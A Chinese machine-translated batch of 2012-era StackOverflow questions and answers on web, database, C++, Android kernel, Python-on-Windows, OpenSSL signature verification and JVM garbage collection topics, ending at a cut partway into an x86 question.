# StackOverflow 问答 11052000-11052999

# c# - asp.net listview 选择鼠标悬停

> ID：11052001
> 
> 赞同：1
> 
> 时间：2012-06-15T13:54:21.037
> 
> 标签：c#, asp.net

将鼠标悬停在列表视图上时如何突出显示整行？例如，如果您将鼠标悬停在一行上，则该行的背景颜色会发生变化。我假设它是 tr 的 onmouseover 属性？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:10:33.717

如果你习惯使用，jQuery 试试这个：

```
$(function(){
$("tr").hover(function(){
    $(this).css('background-color', '#FFFF99');;
    $(this).css('background-color', '#FFFFFF');;
    });
}); 
```

**更新：**

为您的“tr”标签添加一个类，例如：

```
<tr class="trOnHoverChange"></tr>

$(function(){
$(".trOnHoverChange").hover(function(){
    $(this).css('background-color', '#FFFF99');;
    $(this).css('background-color', '#FFFFFF');;
    });
}); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-15T13:58:00.963

我发现这与您的问题相似，并且可能会为您指明正确的方向：

[ASP.NET Gridview：鼠标悬停时突出显示行，然后更新突出显示的行](https://stackoverflow.com/questions/6552963/asp-net-gridview-highlighting-rows-on-mouse-over-then-updating-the-highlighted)

编辑

刚找到这个，听起来像你现在正在做的事情。

[http://forums.asp.net/t/1450332.aspx](http://forums.asp.net/t/1450332.aspx)

# android - 从图形 api 获取位置时访问令牌格式错误

> ID：11052003
> 
> 赞同：-1
> 
> 时间：2012-06-15T13:54:44.180
> 
> 标签：android, facebook, facebook-graph-api, facebook-android-sdk

当我尝试使用以下代码从图形 api 获取长和纬度的地方时

```
https://graph.facebook.com/search?type=place&center="+latitude+","+longitude+"& distance=5000&access_token=..... 
```

我正进入（状态

格式错误的访问令牌错误。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:09:21.113

根据您的代码，您似乎两次传递了访问令牌？

看起来您正在使用访问令牌初始化 Facebook 对象，并在对`/search`;的调用中手动提供它。许多语言会将重复的参数视为一个数组，并且不会正确解析它。

{edit} 您还包括请求的完整 URL，即使 SDK 封装了它。应该是

```
facebook.request("/search?type=place&distance=1000&ce‌​nter=37.76,-122.427"); 
```

# jquery - 在两个 jQuery 动画中间执行代码？

> ID：11052013
> 
> 赞同：3
> 
> 时间：2012-06-15T13:55:15.067
> 
> 标签：jquery, animation

我有以下代码可以切换一些全屏背景图像（淡出，淡入）。

```
setInterval(function() { 
        var id = parseInt($('img.active').attr('id').substring(3,4));
        var id_next = id;
        switch(id) {
            case 0:
                id_next = 1;
                break;
            case 1:
                id_next = 2;
                break;
            case 2:
                id_next = 0;
                break;
        }
        $('img.active').fadeOut('slow', function() {
            $('img#bg_' + id).removeClass('active');
            $('div.start-headline h1').html(hl[id]);
            $('div.start-headline h2').html(sl[id]);
        });
        $('img#bg_' + id_next).fadeIn('slow', function() {
                $('img#bg_' + id_next).addClass('active');
                $('div.start-switches div').removeClass('active');
                $('div.start-switches div#' + id).addClass('active');
            });
    }, 6000); 
```

我怎么能告诉这段代码，它应该执行这两行

```
$('div.start-headline h1').html(hl[id]);
$('div.start-headline h2').html(sl[id]); 
```

在两个淡入淡出的中间？现在它在图像褪色后执行......

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:10:40.123

我认为你正在寻找的是排队，所以它运行 fadeOut -> new queued -> fadeIn

```
$('img.active').fadeOut('slow', function() {
    $('img#bg_' + id).removeClass('active');
});
$('img.active').queue(function() {
    $('div.start-headline h1').html(hl[id]);
    $('div.start-headline h2').html(sl[id]);
    $(this).dequeue();
});
$('img#bg_' + id_next).fadeIn('slow', function() {
    $('img#bg_' + id_next).addClass('active');
    $('div.start-switches div').removeClass('active');
    $('div.start-switches div#' + id).addClass('active');
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:06:55.703

如果我理解了这个问题，我想你只需要把

```
 $('img#bg_' + id_next).fadeIn('slow', function() {
            $('img#bg_' + id_next).addClass('active');
            $('div.start-switches div').removeClass('active');
            $('div.start-switches div#' + id).addClass('active');
        }); 
```

进入回调之后 `$('img#bg_' + id).removeClass('active');`

如果我不能很好地理解这个问题，请您指定代码何时执行（如果在淡入淡出时或之后），也许我可以帮助您。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:09:47.087

大致计算出“慢”动画淡出的时间并添加 100 毫秒，延迟使用该时间。将延迟代码放在淡出之外

```
$('div.start-headline h1').delay(fadeout_time+100).html(hl[id]); 
```

我不知道延迟是否会影响动画，但您可以对其进行测试，看看它是否有效。我认为您还可以设置另一个与您已经必须操作 html 的时间间隔相关的时间间隔

# facebook - 产品列表中 Facebook 按钮的图片、链接和标题。

> ID：11052014
> 
> 赞同：0
> 
> 时间：2012-06-15T13:55:16.963
> 
> 标签：facebook

如何在产品列表中为 Facebook Like 按钮显示正确的图像、标题和链接？

我确实成功地实现了类似按钮，但是当您导航到产品详细信息时，您只会看到一个产品。

我问我如何在产品列表中做到这一点，现在我的 facebook 页面上显示的图像是来自网站的通用图像，而不是产品的特定图像，链接是正确的。

标签必须`<meta property="og:image" content="some value"/>`只在头标签内吗？我不能在 body 标签内使用它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:17:35.340

Like 按钮喜欢特定的 URL，如果它是用户喜欢的产品，那么该链接确实应该将用户带回到该产品的描述，而不是完全不同的内容集。您在该产品页面本身上显示的内容并不重要（如果您真的想要，它可能是完整的产品列表），只要该 URL 每次都向 Facebook 爬虫返回相同的元标记

您可以通过设置一个脚本来实现您想要做的事情，该脚本根据 URL 参数为每​​个产品提供元标记（确保使`og:url`标记指向正确的 URL 以再次生成相同的标记。

将这些标签提供给 Facebook 爬虫，并将其他浏览器重定向到您想要的任何位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T15:05:03.417

新闻报道的元标记不需要出现在显示“赞”按钮的页面上。新闻故事将由 Like 按钮的 URL 参数中列出的页面上的元标记生成。

这是一个例子。-

**此中继器将使用自定义的 Like 按钮从数据库中动态生成产品列表：**

```
<asp:Repeater ID="_RPT_Product" runat="server">
    <HeaderTemplate><h3>Products</h3><ul class="bulleted-list"></HeaderTemplate>
    <ItemTemplate><li><a href="http://www.yourdomainname.com/Product.aspx?ID=<%#((Product)Container.DataItem).ProductID %>" target="_blank"><%# Utilities.ScrubText(((Product)Container.DataItem).ProductName) %></a>
    </li>
        <div style="padding-top:10px;">
        <iframe
            src="https://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.yourdomainname.com/Product.aspx%3FID%3D<%#((Product)Container.DataItem).ProductID %>%26x%3D1&amp;send=false&amp;layout=button_count&amp;width=88&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font&amp;height=23"
            scrolling="no" frameborder="0"
            style="border:none; overflow:hidden; width:88px; height:23px;"
            allowTransparency="true">
        </iframe></div><br />
    </ItemTemplate>
    <FooterTemplate></ul></FooterTemplate>
</asp:Repeater> 
```

**这将是一个单独的产品页面上的代码隐藏，该页面动态呈现来自产品数据库的元标记：**

```
protected void Page_Load(object sender, EventArgs e)
{    
    if (!Page.IsPostBack)
    {
        // Get the product meta content from the ID URL parameter.
        string productName = "";
        string productImageURL = "";
        string productDescription = "";
        int productID = 0;
        if (Request.QueryString["ID"] != null)
        {
            productID = Convert.ToInt32(Request.QueryString["ID"]);
        }
        if (Request.QueryString["ID"] != null)
        {
            using (ProductDatabaseDataContext db = new ProductDatabaseDataContext(Config.ConnectionStrings.ProductDatabase))
            {
                Product select = new Product();
                select = db.Products.FirstOrDefault(p =>
                    p.ProductID == Convert.ToInt32(Request.QueryString["ID"]));
                productName = select.ProductName;
                productImageURL = select.ProductImageURL;
                productDescription = select.ProductDescription;
            }
        }

        // Dynamically generate Open Graph Meta Tags for each Product:
        HtmlMeta _metaTitle = new HtmlMeta();
        _metaTitle.Name = "og:title";
        _metaTitle.Content = "Product: " + productName;
        this.Header.Controls.Add(_metaTitle);

        HtmlMeta _metaURL = new HtmlMeta();
        _metaURL.Name = "og:url";
        _metaURL.Content = "http://www.yourdomainname.com/Product.aspx?ID=" + Convert.ToString(productID);
        this.Header.Controls.Add(_metaURL);

        HtmlMeta _metaImage = new HtmlMeta();
        _metaImage.Name = "og:image";
        _metaImage.Content = Convert.ToString(productImageURL);
        this.Header.Controls.Add(_metaImage);

        HtmlMeta _metaDescription = new HtmlMeta();
        _metaDescription.Name = "og:description";
        _metaDescription.Content = Convert.ToString(productDescription);
        this.Header.Controls.Add(_metaDescription);
    }
} 
```

请注意，每个 Like 按钮必须有一个唯一的 URL 参数，因为只有一组元内容属性可以绑定到单个 URL。这可以通过在单独的 Product.aspx 页面上使用唯一的 ID 参数来实现。如果您只想将所有产品新闻故事链接回一个主列表页面，则每个产品的“og:url”元标记可以相同。

# php - 如何在 PHP 中使用未知数量的参数执行插入查询？

> ID：11052015
> 
> 赞同：1
> 
> 时间：2012-06-15T13:55:23.080
> 
> 标签：php, sql, mysqli

假设我已经提供了所有这些：

*   表的名称
*   包含表中列名的数组
*   包含我要插入表中的值以及这些值的类型的相应数组。

我通常会做这样的查询

```
$stmt = mysqli_stmt_init($mysqli);
if (mysqli_stmt_prepare($stmt, 'INSERT INTO `Table` (columns) VALUES (values) ')) {
  mysqli_stmt_bind_param($stmt, /* types */, /* values */);
  mysqli_stmt_execute($stmt);
  mysqli_stmt_close($stmt);
} 
```

但我不知道如何使它更通用，以便我可以输入我的列名、值和类型，并执行查询。

最好的方法是什么？我宁愿不必为此目的安装库。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T13:59:16.533

好吧，对于列名，您可以只做一个`implode`列数组并将`sprintf`其放入您的查询中。

对于这些类型，您还可以`implode`将它们转换为字符串并将它们输入`mysqli_stmt_bind_param`.

对于值，您必须进行一些棘手的操作（使用[`call_user_func_array`](http://php.net/manual/en/function.call-user-func-array.php)）：

```
$args = array(); // to be put into call_user_func_array

$args[] =& $stmt; // because the statement HAS TO be by reference.
$args[] = implode("", $types);

foreach($values as $value){
    $args[] = $value;
}

call_user_func_array("mysqli_stmt_bind_param", $args); 
```

# spring - 如何集成 Spring 和 Apache Jackrabbit？

> ID：11052019
> 
> 赞同：3
> 
> 时间：2012-06-15T13:55:36.480
> 
> 标签：spring, maven, spring-roo, jackrabbit, jcr

有人可以提供一个集成spring 3和jackrabbit 2.5的例子吗？如果您可以在 oracle 可以用作持久性管理器的示例中提供 spring 配置（applicationContext.xml）和 jackrabbit 配置（repository.xml）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T06:50:10.840

来自 Apache wiki 的 Jackrabbit 和 Spring 示例：[http ://wiki.apache.org/jackrabbit/ExamplesPage](http://wiki.apache.org/jackrabbit/ExamplesPage)

# java - 如何使用 JDO 存储键值对（datanucleus & appengine）

> ID：11052020
> 
> 赞同：1
> 
> 时间：2012-06-15T13:55:42.643
> 
> 标签：java, google-app-engine, primary-key, jdo, datanucleus

我定义了一个 ConfigurationProperty 类，它基本上是一个键值对（键是严格的正整数，值是字符串）：

```
import javax.jdo.annotations.PersistenceCapable;
import javax.jdo.annotations.Persistent;
import javax.jdo.annotations.PrimaryKey;

@PersistenceCapable(detachable = "true")
public final class ConfigurationProperty
{
    @PrimaryKey
    @Persistent
    private Integer id;

    @Persistent
    private String value;

    public ConfigurationProperty(Integer id, String value)
    {
        this.id = id;
        this.setValue(value);
    }

    public Integer getId()
    {
        return this.id;
    }

    public String getValue()
    {
        return value;
    }

    public void setValue(String value)
    {
        this.value = value;
    }
} 
```

如您所见，我正在定义一个字段“id”（它是键值对的键）并将其用作类的主键。

但是，当我尝试访问一个条目时：

```
int searchId = 4;
ConfigurationProperty property =
        this.persistence.getObjectById(ConfigurationProperty.class, searchId); 
```

我得到了例外：

```
javax.jdo.JDOFatalUserException: Received a request to find an object of type [mypackage].ConfigurationProperty identified by 4\.  This is not a valid representation of a primary key for an instance of [mypackage].ConfigurationProperty.

NestedThrowables:
org.datanucleus.exceptions.NucleusFatalUserException: Received a request to find an object of type [mypackage].ConfigurationProperty identified by 4\.  This is not a valid representation of a primary key for an instance of [mypackage].ConfigurationProperty.) 
```

我几乎可以肯定，如果我为主键和对的键创建一个单独的字段，我不会遇到异常，但这会产生某种形式的冗余和可能的性能问题，因为对的键*是*唯一的。

我也只在 Google Appengine 上得到例外。当我使用 Derby 数据库测试应用程序时，没有任何问题。

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T13:59:06.480

只需更改您的主键定义：

```
@PrimaryKey
@Persistent
private Integer id; 
```

至：

```
@PrimaryKey
@Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY)
private Long id; 
```

将工作。

# .htaccess - 在有和没有 SSL 的情况下将 www 添加到 URL

> ID：11052023
> 
> 赞同：0
> 
> 时间：2012-06-15T13:55:57.870
> 
> 标签：.htaccess, mod-rewrite, ssl

我正在编写一个大多数网站都使用 SSL 的网站。

目前我正在使用 htaccess 规则将 www 添加到 URL，请参见以下规则：

```
RewriteCond %{HTTP_HOST} ^bettingproperties.com$ [NC]
RewriteRule ^(.*)$ http://www.bettingproperties.com/$1 [L,R=301] 
```

我怎样才能让它检测到 https 并做同样的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:03:45.170

试试这个，它应该将 SSL 流量切换到常规 HTTP：

```
RewriteEngine on

RewriteCond %{SERVER_PORT} ^443$ 
RewriteRule ^(.*)$ http://www.bettingproperties.com/$1 [L,R=301] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T23:45:07.603

我发现我可以通过使用以下来做到这一点。

```
RewriteCond %{HTTP_HOST} ^bettingproperties.com$ [NC]
RewriteRule ^(.*)$ https://www.bettingproperties.com/$1 [L,R=301] 
```

谢谢您的帮助。

# c++ - C++ 模板错误：没有用于调用 std::vector 的匹配函数 >

> ID：11052027
> 
> 赞同：1
> 
> 时间：2012-06-15T13:56:13.783
> 
> 标签：c++, templates, vector

我无法弄清楚为什么我收到以下代码错误：

```
template <typename T>
class Test{
    void foo(vector<T>& v);
};

template <typename T>
void Test<T>::foo(vector<T>& v){
    //DO STUFF
}

int main(){
      Test<int> t;
      t.foo(vector<int>());
} 
```

这是错误：

```
main.cpp: In function ‘int main()’:
main.cpp:21:21: error: no matching function for call to ‘Test<int>::foo(std::vector<int, std::allocator<int> >)’
main.cpp:21:21: note: candidate is:
main.cpp:14:6: note: void Test<T>::foo(std::vector<T>&) [with T = int]
main.cpp:14:6: note:   no known conversion for argument 1 from ‘std::vector<int, std::allocator<int> >’ to ‘std::vector<int, std::allocator<int> >&’ 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-15T13:57:15.440

您不能将临时对象绑定到非`const`引用。

将您的签名更改为：

```
void foo(vector<T> const& v); 
```

或者不要通过临时：

```
vector<int> temp;
t.foo(temp); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:03:34.873

看起来你正试图将你的类分成声明（通常放在 .h 文件中的东西）和定义（放在 .cpp 文件中的东西）。但是，由于模板的性质，通常将类的所有代码放在标题中。模板代码不能预编译（即不能编译成共享库或DLL），因为在使用代码时类型信息会发生变化。

TLDR: The part where it says "// DO STUFF"... put that in the header and delete anything you may have in the corresponding .cpp.

# mysql - 如何在插入时使用主键

> ID：11052033
> 
> 赞同：0
> 
> 时间：2012-06-15T13:56:21.930
> 
> 标签：mysql, insert, primary-key

我有一个具有自动增量主 ID 的表，有时我需要在此表中插入行，其中有一列需要与主 ID 具有相同的值。如何在插入行之前将此列设置为与主 ID 相同的值？这甚至可能吗，还是在插入行后我必须执行另一个更新查询？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:06:17.983

引用新密钥的规范方法是使用`LAST_INSERT_ID()`. 您可以尝试插入`LAST_INSERT_ID()`作为值：

```
INSERT INTO FOO (dependent_field) values (LAST_INSERT_ID()); 
```

来自[http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html](http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html)

> 您可以使用 LAST_INSERT_ID() SQL 函数或 mysql_insert_id() C API 函数检索最新的 AUTO_INCREMENT 值。这些函数是特定于连接的，因此它们的返回值不受另一个也在执行插入的连接的影响。

警告：我没有对此进行测试，因此很可能`LAST_INSERT_ID()`不会在与生成新 ID 的插入相同的语句中正确评估。如果是这种情况，我能想到的唯一解决方案是按照您的建议进行更新。

# android - 在 HTC Explorer 内核源码中找不到默认配置文件

> ID：11052042
> 
> 赞同：0
> 
> 时间：2012-06-15T13:56:43.500
> 
> 标签：android, linux-kernel

我下载了 htc explorer 的内核源代码（pico-gb-crc-2.6.38-71ff0f2）。但是我在 /arch/arm/config 中找不到默认配置文件。

这些是给定文件夹中的文件

s3c6400_defconfig am200epdkit_defconfig nuc960_defconfig msm_defconfig loki_defconfig sam9_l9260_defconfig pnx4008_defconfig simpad_defconfig pcontrol_g20_defconfig msm7627a_defconfig mx27_defconfig mx1_defconfig spear600_defconfig fortunet_defconfig h7202_defconfig s3c2410_defconfig at91sam9263ek_defconfig magician_defconfig USB-a9260_defconfig lart_defconfig PXA255-idp_defconfig bcmring_defconfig cerfcube_defconfig pxa910_defconfig ixp4xx_defconfig pxa168_defconfig stmp37xx_defconfig u300_defconfig eseries_pxa_defconfig assabet_defconfig s5p64x0_defconfig stmp378x_defconfig ap4evb_defconfig shannon_defconfig u8500_defconfig davinci_all_defconfig neocore926_defconfig cns3420vb_defconfig netwinder_defconfig cam60_defconfig h7201_defconfig stamp9g20_defconfig em_x270_defconfig raumfeld_defconfig netx_defconfig acs5k_tiny_defconfig cpu9g20_defconfigmackerel_defconfig at91rm9200_defconfig at91sam9g20ek_defconfig cm_x2xx_defconfig USB-a9263_defconfig spear300_defconfig collie_defconfig g3evm_defconfig dove_defconfig trizeps4_defconfig acs5k_defconfig edb7211_defconfig colibri_pxa270_defconfig cm_x300_defconfig s5pv210_defconfig colibri_pxa300_defconfig mv78xx0_defconfig ebsa110_defconfig omap1_defconfig kirkwood_defconfig pcm027_defconfig spitz_defconfig omap2plus_defconfig at91cap9adk_defconfig ep93xx_defconfig的RealView-smp_defconfig viper_defconfig integrator_defconfig ag5evm_defconfig mx21_defconfig spear320_defconfig imote2_defconfig at91sam9260ek_defconfig shark_defconfig rpc_defconfig iop33x_defconfig hackkit_defconfig nuc950_defconfig realview_defconfig ezx_defconfig xcep_defconfig at572d940hfek_defconfig spear310_defconfig versatile_defconfig mx51_defconfig jornada720_defconfig lpd7a400_defconfig orion5x_defconfig pleb_defconfig h5000_defconfig lpd270_defconfig tct_hammer_defconfig ixp2000_defconfig iop13xx_defconfig at91sam9261ek_defconfig nhk8815_defconfig s5p6442_defconfig badge4_defconfig footbridge_defconfig mainstone_defconfig ns9xxx_defconfig nuc910_defconfig QIL-a9260_defconfig ixp23xx_defconfig mini2440_defconfig lpd7a404_defconfig neponset_defconfig pxa3xx_defconfig lubbock_defconfig corgi_defconfig at91sam9rlek_defconfig h3600_defconfig mmp2_defconfig g4evm_defconfig s5pc100_defconfig mx3_defconfig ks8695_defconfig zeus_defconfig cpu9260_defconfig palmz72_defconfig afeb9260_defconfig iop32x_defconfig da8xx_omapl_defconfigdefconfig footbridge_defconfig mainstone_defconfig ns9xxx_defconfig nuc910_defconfig QIL-a9260_defconfig ixp23xx_defconfig mini2440_defconfig lpd7a404_defconfig neponset_defconfig pxa3xx_defconfig lubbock_defconfig corgi_defconfig at91sam9rlek_defconfig h3600_defconfig mmp2_defconfig g4evm_defconfig s5pc100_defconfig mx3_defconfig ks8695_defconfig zeus_defconfig cpu9260_defconfig palmz72_defconfig afeb9260_defconfig iop32x_defconfig da8xx_omapl_defconfigdefconfig footbridge_defconfig mainstone_defconfig ns9xxx_defconfig nuc910_defconfig QIL-a9260_defconfig ixp23xx_defconfig mini2440_defconfig lpd7a404_defconfig neponset_defconfig pxa3xx_defconfig lubbock_defconfig corgi_defconfig at91sam9rlek_defconfig h3600_defconfig mmp2_defconfig g4evm_defconfig s5pc100_defconfig mx3_defconfig ks8695_defconfig zeus_defconfig cpu9260_defconfig palmz72_defconfig afeb9260_defconfig iop32x_defconfig da8xx_omapl_defconfigfeb9260_defconfig iop32x_defconfig da8xx_opl_defconfigfeb9260_defconfig iop32x_defconfig da8xx_opl_defconfig

有没有办法找出默认配置文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T15:30:51.757

大概一部 HTC 手机会设置一些 CONFIG_HTC 项目：

```
pico-gb-crc-2.6.38-71ff0f2$ grep -lR 'CONFIG_HTC.*=y' * 

arch/arm/configs/msm7627a_defconfig
arch/arm/configs/magician_defconfig 
```

第一个结果看起来更合理（当 -l 标志被省略时它有更多的命中），但让我们确定 - 一个 android 设备通常也会有一些 ANDROID 配置选项：

```
pico-gb-crc-2.6.38-71ff0f2$ grep -l ANDROID arch/arm/configs/*
arch/arm/configs/msm7627a_defconfig 
```

# python - 如何在 Windows OS 上给定 Python 中的 PID 确定正在运行的进程？

> ID：11052043
> 
> 赞同：4
> 
> 时间：2012-06-15T13:56:48.343
> 
> 标签：python, windows, windows-xp, pid, tasklist

我有一个 python 脚本，它启动一个应用程序，并获取 PID，并等到该进程 ID 不再使用：

```
result = subprocess.Popen( r'tasklist /fi "PID eq ' + str(PID) + '"', stdout=subprocess.PIPE, stderr=subprocess.STDOUT) 
```

这对我来说很好，直到我尝试在 XP Home 上运行它，当然，没有 tasklist.exe

给定进程的PID，是否有另一种检测进程是否正在运行的方法。

简单地使用 subprocess.Popen 启动进程并等待它完成不是一个选项，因为必须分离该进程，因为我需要在初始进程运行时执行其他任务。

有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T17:40:46.693

如果您不介意安装[Python Win32 扩展](http://sourceforge.net/projects/pywin32/)，您可以使用 Windows API 等待进程退出，如下所示：

```
from win32con import SYNCHRONIZE
from win32event import WaitForSingleObject, INFINITE
from win32api import OpenProcess, CloseHandle

process_handle = OpenProcess(SYNCHRONIZE, False, pid)
try:
    WaitForSingleObject(process_handle, INFINITE)
finally:
    CloseHandle(process_handle) 
```

这将导致代码阻塞，直到进程退出（如果需要，可以更改`INFINITE`in值；请参阅[文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ms687032%28v=vs.85%29.aspx)）。`WaitForSingleObject()`

* * *

或者，无需安装扩展程序，您可以使用 来执行此操作`ctypes`，特别简单，因为所有必要的方法都在`kernel32.dll`：

```
from ctypes import windll

SYNCHRONIZE = 0x100000L
INFINITE    = 0xFFFFFFFFL

process_handle = windll.kernel32.OpenProcess(SYNCHRONIZE, 1, pid)
windll.kernel32.WaitForSingleObject(process_handle, INFINITE)
windll.kernel32.CloseHandle(process_handle) 
```

当然，在这种情况下，错误处理代码（省略）要复杂一些，而且远不如 Pythonic。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:05:43.453

您可以尝试使用 WMIC。我认为它在 XP Home 中可用。这是命令：

```
wmic process get description,executablepath,processid 
```

# text - 从 .rtf 加载文本

> ID：11052044
> 
> 赞同：0
> 
> 时间：2012-06-15T13:57:08.580
> 
> 标签：text, load, uitextview, rtf

嘿伙计们，我正在尝试从 .rtf 文件加载长文本，我想在 UITextView 中显示此文本。我将所有 .rtf 文件存储在名为“rtf”的文件夹中的“Supporting Files”文件夹中。这是我的代码。

```
- (void)setDetailItem:(id)newDetailItem
{
    if (_detailItem != newDetailItem) {
        _detailItem = newDetailItem;

        // Update the view.
        [self configureView];
    }

}

- (void)configureView
{
    // Update the user interface for the detail item.
    if (self.detailItem) 
    {
        self.textView.text = [self setTextForTextView:[self.detailItem description]];
    }

}

-(NSString *)setTextForTextView:(NSString *)description
{
    NSString *path = [NSString stringWithFormat:@"rtf/%@.rtf" ,description];
    NSLog(@"%@" ,path);
    NSString *myText = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];

    return myText;

}

- (void)viewDidLoad
{
    [super viewDidLoad];

    self.navigationItem.title = @"Text";
    // Do any additional setup after loading the view, typically from a nib.
    [self configureView];
} 
```

但它没有向我显示文字，我不明白为什么......谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:16:58.833

我就是这样解决的：

```
-(NSString *)setTextForTextView:(NSString *)description
{

    NSString *filePath = [[NSBundle mainBundle] pathForResource:description ofType:@"txt"];  
    if (filePath) 
    {  
        NSString *myText = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil];  

        if (myText) 
        {  
            return myText;
        }  
    }  

} 
```

我希望这对将来的一些人有所帮助！:D

# cryptography - 如何使用 CryptSignMessage 的结果和 OpenSSL 来验证数字签名

> ID：11052048
> 
> 赞同：1
> 
> 时间：2012-06-15T13:57:16.870
> 
> 标签：cryptography, openssl, digital-signature, cryptoapi

我正在尝试验证分离的 PKCS#7 签名。使用 WIN32 CryptoAPI 函数 CryptSignMessage() 生成的文件。文件在客户端签名，但必须在服务器端 FreeBSD 验证。所以我不能使用 CryptoAPI。

请帮助我确定如何将 OpenSSL 用于此类任务。现在我有两个文件 FILENAME.xml 和 FILENAME.xml.sig 包含签名信息。根据规范，该文件包括“指定内容的散列，对散列进行签名，然后对原始消息内容和签名的散列进行编码”。我发现它还包含证书。使用 openssl 我可以从此文件中检索公钥和证书，但我不知道如何检索签名信息？

所以我试图从这个文件中检索信息，比如公钥和签名，以便与 openssl 命令一起使用

> openssl dgst -verify PUBLIC_KEY_FILE -signature SIGNATURE_FILE -md_gost94 FILENAME.xml 验证失败

还有可以从这个文件中读取所有信息的服务。[http://notary.cryptopro.ru/Detached.aspx](http://notary.cryptopro.ru/Detached.aspx)

```
Information about EDS:
Algortim hashing:
Name:
GOST R 34.11-94
ID:
1.2.643.2.2.9
Algortim public key:
Name:
GOST R 34.10-2001
ID:
1.2.643.2.2.19
Value:
2DEA 8713 5AS2 69AA 34E0 B333 EF61 3773 5CF1
3BC4 BAD0 1745 0DDD 9577 FFAE BA4A A9EB A8CF
64B9 C338 1513 8BDB C478 BA3A 5409 6419 03A6
DD3A 04D2 D132 3319 8031
Serial Number: 1F11 EF05 0001 0000 1032 
```

也许我不明白一些事情。请帮忙。有可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-04T09:33:50.690

如果您使用`CryptSignMessage()`函数，则您拥有此公钥的证书。因此，您可以使用`openssl cms`服务（在某些发行版中，openssl 是在没有它的情况下构建的，在这种情况下，您可以使用`enable-cms`选项重新编译它们）。

示例命令是：

```
openssl cms -verify -nointern -noverify -certfile CERTIFICATE_FILE -inform DER -in SIGNATURE_FILE -content CONTENT_FILE -out /dev/null 
```

其中 CERTIFICATE_FILE 是**Base64**形式的证书。

PS 我不确定 GOST 算法是否支持。首先尝试 sha1RSA。

# java - JVM 垃圾回收

> ID：11052064
> 
> 赞同：7
> 
> 时间：2012-06-15T13:57:57.697
> 
> 标签：java, garbage-collection, jvm

一般来说（据我所知，Oracle/sun 和其他第三方以及 MS 等有一个标准的 JVM 实现），JVM 是否只创建一个作为守护进程运行的垃圾收集线程来收集垃圾对象，或者 JVM 是否产生超过一个线程来完成垃圾收集？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:05:54.343

`-XX:+UseParallelGC`启用并作为默认收集器的“吞吐量收集器”使用多个线程。启用的“并发低暂停收集器”`-XX:+UseConcMarkSweepGC`使用一个线程进行并发收集器，但它的停止世界收集是并行的。

只有很少使用的单线程 gc`-XX:+UseSerialGC`是单线程的。

[http://www.oracle.com/technetwork/java/gc-tuning-5-138395.html](http://www.oracle.com/technetwork/java/gc-tuning-5-138395.html)

[http://www.oracle.com/technetwork/java/javase/tech/vmoptions-jsp-140102.html](http://www.oracle.com/technetwork/java/javase/tech/vmoptions-jsp-140102.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:07:20.307

*-XX:ConcGCThreads=n* -- 并发垃圾收集器将使用的线程数。默认值随运行 JVM 的平台而异。

[http://www.oracle.com/technetwork/java/javase/tech/vmoptions-jsp-140102.html#G1Options](http://www.oracle.com/technetwork/java/javase/tech/vmoptions-jsp-140102.html#G1Options)

可能有更多的垃圾收集器线程，但你不应该依赖它们的数量、运行顺序或任何东西。然而，有一些基本的东西，你可以依靠。例如：*Object.finalize()*将被调用一次且仅一次。

另请查看*Tuning Garbage collector*，关于以下问题：

[http://www.oracle.com/technetwork/java/gc-tuning-5-138395.html#1.1.%20Types%20of%20Collectors%7Coutline](http://www.oracle.com/technetwork/java/gc-tuning-5-138395.html#1.1.%20Types%20of%20Collectors%7Coutline)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-12-09T06:16:54.163

Oracle 的 Garbage-First GC 算法（Java 8 中可用，Java 9 中的默认选项）是一种并行/并发 GC 算法，因此涉及多个线程。具体来说，有许多线程用于垃圾收集：

*   ParallelGC 线程是在“停止世界”收集阶段使用的线程
*   并行标记线程（或并发 GC 线程）是用于将区域标记为候选清理和运行而不停止应用程序线程的线程
*   G1 并发细化线程负责标记对单个区域的记住引用集的更改

G1GC 可以通过设置启用`-XX:+UseG1GC`（请注意，虽然在 Java 7 中可用，但 G1GC 在那个时间点是不可靠的，所以不要在生产中使用它（并且由于 Java 7 已经报废，你不应该在生产中使用它）任何一个））。

来源[https://blogs.oracle.com/g1gc/entry/g1gc_faq](https://blogs.oracle.com/g1gc/entry/g1gc_faq)和[http://www.oracle.com/technetwork/articles/java/g1gc-1984535.html](http://www.oracle.com/technetwork/articles/java/g1gc-1984535.html)

# x86 - CPU 架构 8085 和 8086（以及基于 8086 的 CPU）有何不同和分类？

> ID：11052065
